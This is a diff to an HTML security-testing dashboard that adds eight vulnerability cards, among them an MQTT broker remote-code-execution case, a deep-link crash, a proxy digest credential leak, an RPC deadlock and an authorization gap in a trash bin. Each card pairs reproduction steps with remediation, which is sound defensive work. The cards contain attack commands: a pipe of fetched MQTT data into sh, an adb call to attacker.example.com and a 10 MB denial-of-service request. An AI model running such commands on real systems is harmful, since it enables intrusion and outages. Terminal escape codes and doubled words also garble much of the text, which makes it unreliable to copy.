@@ -592,11 +592,11 @@
     <section class="top-row">
       <div class="metric">
         <h2>Total Test Cases</h2>
-        <div class="metric-value">271</div>
+        <div class="metric-value">279</div>
       </div>
       <div class="metric">
         <h2>Last Updated</h2>
-        <div class="metric-value">2026-04-16</div>
+        <div class="metric-value">2026-05-08</div>
       </div>
     </section>
 
@@ -604,7 +604,7 @@
       <h2>Category Breakdown</h2>
       
     <div class="analytics-row">
-      <div class="analytics-label">Web App <span>123</span></div>
+      <div class="analytics-label">Web App <span>124</span></div>
       <div class="analytics-bar">
         <div class="analytics-bar-fill" style="width:100%"></div>
       </div>
@@ -612,25 +612,25 @@
     
 
     <div class="analytics-row">
-      <div class="analytics-label">Network <span>83</span></div>
+      <div class="analytics-label">Network <span>86</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:67%"></div>
+        <div class="analytics-bar-fill" style="width:69%"></div>
       </div>
     </div>
     
 
     <div class="analytics-row">
-      <div class="analytics-label">API <span>35</span></div>
+      <div class="analytics-label">API <span>37</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:28%"></div>
+        <div class="analytics-bar-fill" style="width:30%"></div>
       </div>
     </div>
     
 
     <div class="analytics-row">
-      <div class="analytics-label">Source Code <span>24</span></div>
+      <div class="analytics-label">Source Code <span>26</span></div>
       <div class="analytics-bar">
-        <div class="analytics-bar-fill" style="width:20%"></div>
+        <div class="analytics-bar-fill" style="width:21%"></div>
       </div>
     </div>
     
@@ -676,11 +676,11 @@
       <div>
         <label for="categoryFilter">Category</label>
         <select id="categoryFilter">
-          <option value="all">All Categories (271)</option>
-          <option value="Web App">Web App (123)</option>
-<option value="Network">Network (83)</option>
-<option value="API">API (35)</option>
-<option value="Source Code">Source Code (24)</option>
+          <option value="all">All Categories (279)</option>
+          <option value="Web App">Web App (124)</option>
+<option value="Network">Network (86)</option>
+<option value="API">API (37)</option>
+<option value="Source Code">Source Code (26)</option>
 <option value="Other">Other (3)</option>
 <option value="Blockchain">Blockchain (1)</option>
 <option value="Desktop App">Desktop App (1)</option>
@@ -693,6 +693,460 @@
 
     <section class="cards" id="cardContainer">
       
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">Denial-of-Service via Deep-Link Handler Null Dereference</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-05-08</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A crafted deep-link can trigger a null dereference within [K</p>
+<p>an exported activity handler, leading to an application crash. This vulnera[7D[K</p>
+<p>vulnerability occurs due to improper input validation and the absence of nu[2D[K</p>
+<p>null checks before accessing user-related objects. This can be exploited to[2D[K</p>
+<p>to cause a denial-of-service.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>On a device with the application installed, execute the following adb co[2D[K</li>
+</ol>
+<p>command to invoke the deep-link:</p>
+
+<pre><code>adb shell am start -a android.intent.action.VIEW \
+  -d &quot;https://attacker.example.com/f/abcdef&quot; \
+  -n &lt;PACKAGE_NAME&gt;/&lt;ACTIVITY_NAME&gt;</code></pre>
+
+<ol>
+<li>Observe that the application crashes, resulting in a &quot;App has stopped&quot; e[1D[K</li>
+</ol>
+<p>error.</p>
+<ol>
+<li>Examine the application logs for a <code>NullPointerException</code> related to acc[3D[K</li>
+</ol>
+<p>accessing an object within the activity context.</p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The application crashes, resulting in a denial-of-service condi[5D[K</p>
+<p>condition.  Depending on the context, exploiting this vulnerability could p[1D[K</p>
+<p>potentially lead to further issues like unintended data access or exposure.[9D[K</p>
+<p>exposure.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation to ensure deep-link data[4D[K</p>
+<p>data is properly sanitized.  Always perform null checks before accessing us[2D[K</p>
+<p>user-related objects. Utilize a strict allowlist for deep-link hosts and pa[2D[K</p>
+<p>paths, and handle unexpected or malformed intents gracefully to avoid crash[5D[K</p>
+<p>crashes.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">MQTT Packet Type Bypass - Remote Code Execution</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-05-08</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows a malicious MQTT broker to send [K</p>
+<p>arbitrary packet types during the connection handshake, bypassing validatio[9D[K</p>
+<p>validation checks in the MQTT client. By sending a non-CONNACK packet type [K</p>
+<p>and controlling the payload, an attacker can achieve remote code execution [K</p>
+<p>on the client machine, potentially leading to firmware takeover, config poi[3D[K</p>
+<p>poisoning, and data integrity compromise.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a malicious MQTT broker to send a fake CONNACK packet. The bro[3D[K</li>
+</ol>
+<p>broker should send a packet with a type other than CONNACK (e.g., PUBACK - [K</p>
+<p><code>0x40</code>), a remaining length of 2, and a payload of <code>0x00 0x00</code>.</p>
+<ol>
+<li>Initiate an MQTT connection to the malicious broker using a vulnerable M[1D[K</li>
+</ol>
+<p>MQTT client (e.g., a curl client).</p>
+<ol>
+<li>The client should subscribe to a topic.</li>
+<li>The broker should then send a PUBLISH packet containing a malicious payl[4D[K</li>
+</ol>
+<p>payload, such as a shell command to be executed by the client (e.g., `#!/bi[6D[K</p>
+<p><code>#!/bin/sh\nid\n</code>).</p>
+<ol>
+<li>The client, upon receiving the PUBLISH packet, should pipe the data to [K</li>
+</ol>
+<p>a shell, interpreter, or executor.</p>
+<ol>
+<li>Observe that the shell executes the payload delivered by the broker, dem[3D[K</li>
+</ol>
+<p>demonstrating remote code execution.</p>
+<pre><code>curl mqtt://&lt;TARGET_URL&gt;/topic | sh</code></pre>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Remote Code Execution, leading to potential firmware takeover, [K</p>
+<p>configuration poisoning, or data integrity compromise. An attacker can exec[4D[K</p>
+<p>execute arbitrary commands on the client machine, potentially compromising [K</p>
+<p>the entire system.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict packet type validation in the MQTT client[6D[K</p>
+<p>client during the handshake process. Ensure that the received packet type i[1D[K</p>
+<p>is verified against a known set of allowed types (specifically, verifying t[1D[K</p>
+<p>that the received packet is a CONNACK). Restore and utilize the `MQTT<em>MSG</em>C[11D[K</p>
+<p><code>MQTT<em>MSG</em>CONNACK</code> define and check the <code>firstbyte</code> field to ensure only va[2D[K</p>
+<p>valid CONNACK packets are processed.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">Stale Proxy Digest Authentication Leak via Proxy Port Change</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-05-08</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises from an incomplete fix in a netw[4D[K</p>
+<p>network library. When a client changes the proxy port (<code>CURLOPT_PROXYPORT</code>)[21D[K</p>
+<p>(<code>CURLOPT<em>PROXYPORT</code>) without changing the proxy URL (<code>CURLOPT</em>PROXY</code>), the[3D[K</p>
+<p>the library fails to clear the cached Proxy Digest authentication state. Th[2D[K</p>
+<p>This allows a stale authentication token from a previous proxy to be uninte[6D[K</p>
+<p>unintentionally sent to a subsequent proxy, potentially compromising the se[2D[K</p>
+<p>security of the connection.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a proxy server.</li>
+<li>Configure a client to use the proxy server, initially specifying a proxy[5D[K</li>
+</ol>
+<p>proxy port.</p>
+<ol>
+<li>Modify the client configuration to change only the proxy port, while kee[3D[K</li>
+</ol>
+<p>keeping the proxy URL the same.</p>
+<ol>
+<li>Observe the network traffic captured between the client and the second p[1D[K</li>
+</ol>
+<p>proxy server.</p>
+<ol>
+<li>Verify that the client sends a <code>Proxy-Authorization: Digest</code> header cont[4D[K</li>
+</ol>
+<p>containing authentication details derived from the first proxy server&#x27;s rea[3D[K</p>
+<p>realm and nonce.</p>
+
+<p>Example Payload:</p>
+<p>The <code>Proxy-Authorization: Digest</code> header would contain elements such as:</p>
+<p>`Proxy-Authorization: Digest realm=&quot;&lt;proxyArealm&gt;&quot;, nonce=&quot;&lt;proxyAnonce&gt;&quot;, [K</p>
+<p>...`</p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> A stale Proxy Digest authentication token being sent to a subse[5D[K</p>
+<p>subsequent proxy can potentially be exploited to bypass authentication chec[4D[K</p>
+<p>checks or gain unauthorized access. It represents a compromise of the netwo[5D[K</p>
+<p>network connection&#x27;s integrity.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that all relevant authentication state is cleared w[1D[K</p>
+<p>when any proxy-related configuration (including the port) is modified.  Imp[3D[K</p>
+<p>Implement a robust mechanism to invalidate cached credentials when switchin[8D[K</p>
+<p>switching between proxy servers or configurations.  Follow best practices f[1D[K</p>
+<p>for secure proxy authentication.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Source Code</span>
+          <span class="card-title-text">File Descriptor Leak During Error Handling</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-05-08</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A resource leak can occur when a function returns an error[5D[K</p>
+<p>error without properly releasing a resource that it acquired. In this case,[5D[K</p>
+<p>case, a file stream is not closed, leading to potential file descriptor exh[3D[K</p>
+<p>exhaustion and a denial-of-service condition. This can prevent other proces[6D[K</p>
+<p>processes from opening files.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Analyze the source code of the target application using a static analysi[7D[K</li>
+</ol>
+<p>analysis tool (e.g., scan-build make).</p>
+<ol>
+<li>Identify functions that open file streams and return error codes.</li>
+<li>Verify that the functions properly close the file streams before returni[7D[K</li>
+</ol>
+<p>returning in all possible error paths.</p>
+<ol>
+<li>If an error condition (e.g., &lt;ERROR_CONDITION&gt;) triggers a return, confi[5D[K</li>
+</ol>
+<p>confirm that a <code>fclose()</code> or equivalent resource release function is called[6D[K</p>
+<p>called prior to the return statement.</p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can potentially trigger this condition repeatedly, [K</p>
+<p>leading to file descriptor exhaustion and a denial-of-service (DoS) attack,[7D[K</p>
+<p>attack, potentially preventing legitimate processes from accessing files.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that all acquired resources are properly released i[1D[K</p>
+<p>in all possible execution paths, including error conditions. Implement erro[4D[K</p>
+<p>error handling that always includes resource cleanup before returning, usin[4D[K</p>
+<p>using techniques like RAII (Resource Acquisition Is Initialization) or `try[4D[K</p>
+<p><code>try-finally</code> blocks to guarantee resource release.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Excessive Resource Consumption Due to Improper Input Validation [K</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-05-08</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p>in Authentication Endpoint</p>
+
+
+<p><strong class="section-heading section-description">Description:</strong> The authentication endpoint processes user-supplied input [K</p>
+<p>before enforcing field-level validation, leading to excessive resource cons[4D[K</p>
+<p>consumption when handling oversized payloads. This flaw violates the fail-f[6D[K</p>
+<p>fail-fast principle, as the system performs resource-intensive operations l[1D[K</p>
+<p>like request buffering and JSON parsing before validating input, even if th[2D[K</p>
+<p>the input is clearly malformed.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a POST request to the authentication endpoint located at `&lt;TARGET_U[10D[K</li>
+</ol>
+<p><code>&lt;TARGET_URL&gt;</code>.</p>
+<ol>
+<li>Set the <code>Content-Type</code> header to <code>application/json</code>.</li>
+<li>Construct a JSON payload containing a username and an oversized password[8D[K</li>
+</ol>
+<p>password.</p>
+<ol>
+<li>Utilize a tool like <code>curl</code> to send the request, incorporating a large pa[2D[K</li>
+</ol>
+<p>payload for the password. For example:</p>
+<pre><code>curl -X POST &lt;TARGET_URL&gt; \
+  -H &quot;Content-Type: application/json&quot; \
+  --data-binary @&lt;(python3 -c &#x27;
+payload = &quot;A&quot; * (10 * 1024 * 1024)
+print(f&#x27;{{&quot;username&quot;:&quot;&lt;USER_ID&gt;&quot;, &quot;password&quot;:&quot;{payload}&quot;}}&#x27;)
+&#x27;)</code></pre>
+<ol>
+<li>Observe the server&#x27;s response and resource usage.  Note any delays or hi[2D[K</li>
+</ol>
+<p>high CPU/memory utilization.</p>
+<ol>
+<li>Verify that the endpoint rejects the request after processing the large [K</li>
+</ol>
+<p>payload, typically with an authentication failure response (e.g., `{&quot;code&quot;:[9D[K</p>
+<p><code>{&quot;code&quot;:2,&quot;error&quot;:&quot;Login failed.&quot;}</code>).</p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The vulnerability can lead to increased resource consumption on[2D[K</p>
+<p>on the server, potentially impacting performance and availability. Although[8D[K</p>
+<p>Although infrastructure limits might exist, the application needlessly proc[4D[K</p>
+<p>processes large, untrusted inputs before validation.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement early input validation, including strict field-s[7D[K</p>
+<p>field-size limits for sensitive fields like passwords. Ensure a &quot;fail-fast&quot;[11D[K</p>
+<p>&quot;fail-fast&quot; approach, where validation checks are performed <em>before</em> reques[6D[K</p>
+<p>request buffering and JSON parsing. Consider setting Content-Length limits [K</p>
+<p>in reverse proxies or load balancers to prevent excessively large requests.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Critical Deadlock in Batch RPC Handling</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-05-08</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A vulnerability exists in the batch processing of remote p[1D[K</p>
+<p>procedure calls (RPC) that can lead to a deadlock, causing the target servi[5D[K</p>
+<p>service to become completely unresponsive. This denial-of-service condition[9D[K</p>
+<p>condition is easily exploitable and requires no authentication, potentially[11D[K</p>
+<p>potentially impacting availability, integrity, and confidentiality.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Start the target service with RPC enabled, configuring network binding a[1D[K</li>
+</ol>
+<p>and data directory as needed.</p>
+<ol>
+<li>Execute a script (or manually construct) a batch of RPC requests, mixing[6D[K</li>
+</ol>
+<p>mixing valid and potentially resource-intensive or malformed requests. The [K</p>
+<p>script should adapt batch sizes based on server responses to bypass rate li[2D[K</p>
+<p>limiting or other defenses.</p>
+<ol>
+<li>Observe the target service&#x27;s behavior.  Monitor resource usage, responsi[8D[K</li>
+</ol>
+<p>responsiveness to other requests, and its ability to terminate normally.</p>
+<ol>
+<li>An example request might include a mix of valid methods and intentional[11D[K</li>
+</ol>
+<p>intentionally malformed ones, sent in parallel using multiple threads. For [K</p>
+<p>example:</p>
+<pre><code>python3 exploit/PoC.py &lt;TARGET_URL&gt; &lt;NUM_THREADS&gt; &lt;BATCH_SIZE&gt;</code></pre>
+<p>where <code>&lt;TARGET<em>URL&gt;</code> is the RPC endpoint, <code>&lt;NUM</em>THREADS&gt;</code> defines the numbe[5D[K</p>
+<p>number of concurrent threads to use, and <code>&lt;BATCH_SIZE&gt;</code> is the initial numb[4D[K</p>
+<p>number of RPC requests per batch.</p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The target service becomes completely unresponsive, requiring a[1D[K</p>
+<p>a forced termination (e.g., <code>kill -9</code>) to recover. This results in a denial[6D[K</p>
+<p>denial of service, potentially leading to data corruption or exposure of se[2D[K</p>
+<p>sensitive information during an unsafe shutdown.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust locking mechanisms and resource managemen[9D[K</p>
+<p>management strategies to prevent circular dependencies and deadlocks within[6D[K</p>
+<p>within the RPC handling threads. Thoroughly review and test batch processin[9D[K</p>
+<p>processing logic, especially when dealing with diverse or potentially malfo[5D[K</p>
+<p>malformed requests. Use appropriate thread-safe data structures and ensure [K</p>
+<p>clear resource ownership to avoid contention and prevent deadlocks.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Source Code</span>
+          <span class="card-title-text">API Contract Violation in Private Key Parsing</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-05-08</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves a violation of the mbedTLS API[3D[K</p>
+<p>API contract when parsing private keys. The code fails to ensure null-termi[10D[K</p>
+<p>null-termination of the private key blob data before passing it to the mbed[4D[K</p>
+<p>mbedTLS parsing function, resulting in undefined behavior and potentially l[1D[K</p>
+<p>leading to issues like parse failure, out-of-bounds reads, or other unpredi[7D[K</p>
+<p>unpredictable outcomes.  The inconsistency in handling compared to certific[8D[K</p>
+<p>certificate and CA blob processing highlights a potential hardening issue.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Clone a version of the codebase (e.g., from a Git repository) with the v[1D[K</li>
+</ol>
+<p>vulnerable component (e.g., a library with private key parsing functionalit[12D[K</p>
+<p>functionality).</p>
+<ol>
+<li>Locate the function responsible for loading private keys (e.g., `mbed_lo[8D[K</li>
+</ol>
+<p><code>mbed<em>load</em>privkey</code>).</p>
+<ol>
+<li>Examine the code where the private key blob data and its length are pass[4D[K</li>
+</ol>
+<p>passed to the parsing function. Verify that null-termination is not explici[7D[K</p>
+<p>explicitly enforced or that the data is not duplicated with a null terminat[8D[K</p>
+<p>terminator.</p>
+<ol>
+<li>Compare this behavior with how certificate or CA blobs are handled in th[2D[K</li>
+</ol>
+<p>the same codebase to confirm the inconsistency.</p>
+<ol>
+<li>To test, construct a private key blob input that is not null-terminated.[16D[K</li>
+</ol>
+<p>null-terminated. Pass this blob via a publicly exposed option that uses thi[3D[K</p>
+<p>this parsing functionality (e.g., &lt;OPTION_NAME&gt;).</p>
+<ol>
+<li>Observe the behavior of the application. Look for errors, crashes, or un[2D[K</li>
+</ol>
+<p>unexpected behavior that might indicate a violation of the API contract.</p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The potential impact of this vulnerability ranges from parse fa[2D[K</p>
+<p>failures, making the application unable to use the provided key, to undefin[7D[K</p>
+<p>undefined behavior that could lead to crashes, memory corruption, or even i[1D[K</p>
+<p>information disclosure depending on the internal behavior of the linked mbe[3D[K</p>
+<p>mbedTLS library.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Ensure that all private key blob data is properly null-te[7D[K</p>
+<p>null-terminated before passing it to the parsing function.  This can be ach[3D[K</p>
+<p>achieved by either ensuring that input data is always null-terminated or, p[1D[K</p>
+<p>preferably, by duplicating the data using a memory allocation function that[4D[K</p>
+<p>that guarantees null-termination (e.g., <code>curlx_memdup0</code>) before passing it [K</p>
+<p>to the parsing function and passing the length as length + 1. Maintain cons[4D[K</p>
+<p>consistent handling for all blob types (private keys, certificates, and CA [K</p>
+<p>certificates) to avoid unexpected behavior and provide predictable guarante[8D[K</p>
+<p>guarantees for application developers.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Unauthorized Access to Deleted Resources in Trash Bin</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-05-08</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> View-only users were able to access and view deleted resou[5D[K</p>
+<p>resources (in this case, Collectives pages) that were present in the trash [K</p>
+<p>bin. This represents a potential information disclosure issue as it allows [K</p>
+<p>users without proper permissions to view data they should not have access t[1D[K</p>
+<p>to, even after deletion.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Log in to the application as a user with &quot;view-only&quot; permissions.</li>
+<li>Log in as an administrator user.</li>
+<li>As the administrator, create a Collective page.</li>
+<li>As the administrator, move the Collective page to the trash bin.</li>
+<li>As the view-only user, attempt to access the deleted Collective page by [K</li>
+</ol>
+<p>directly manipulating the URL (e.g., appending &quot;/trash&quot; or similar to the o[1D[K</p>
+<p>original URL).</p>
+<ol>
+<li>Observe that the view-only user is able to view the contents of the dele[4D[K</li>
+</ol>
+<p>deleted Collective page.</p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized disclosure of sensitive data contained within dele[4D[K</p>
+<p>deleted resources, potentially violating privacy or confidentiality.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper access control checks to ensure that only[4D[K</p>
+<p>only authorized users (e.g., administrators or users with specific permissi[8D[K</p>
+<p>permissions) can access the trash bin and its contents.  Ensure deletion pr[2D[K</p>
+<p>processes effectively restrict access to the deleted items.</p>
+      </div>
+    </article>
+    
+
     <article class="card" data-category="API">
       <button type="button" class="card-toggle">
         <span class="card-title">
